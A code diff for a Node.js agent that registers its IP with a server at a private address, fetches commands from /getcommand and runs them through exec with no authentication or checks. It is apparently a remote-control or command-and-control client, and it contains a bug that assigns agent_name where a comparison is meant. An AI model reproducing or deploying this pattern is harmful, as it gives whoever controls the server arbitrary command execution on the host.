@@ -19,7 +19,7 @@ const ipinfo = {
 };
 
 const getcommand = {
-    url: 'http://localhost:4000/getcommand',
+    url: 'http://172.16.16.160:4000/getcommand',
     method: 'GET',
    
 };
@@ -35,7 +35,7 @@ const getcommand = {
 			console.log(ipinfo_res.ip);
 	
 			const options = {
-				url: 'http://localhost:4000/agentdetails',
+				url: 'http://172.16.16.160:4000/agentdetails',
                 method: 'POST',
                 headers :{
                     accept: '*/*',
@@ -57,13 +57,21 @@ const getcommand = {
                if(err){
                    console.log(err)
                }else{
-                   execute = JSON.stringify(body)
-                   console.log(execute);
-                   exec('ls', function(err, stdout, stderr) 
+                   execute = JSON.parse(body)
+                   console.log(body)
+                   console.log("command is " + execute[0].command);
+                   
+                   execute.forEach(i=>{
+                    if (i.agent_name = myaddr){
+                        exec(execute[0].command, function(err, stdout, stderr) 
                        {if (err)
                                 {console.log(stderr);}
                        else 
                                 {console.log(stdout);}});
+                    }
+                  })
+
+                   
                }
             })
 	
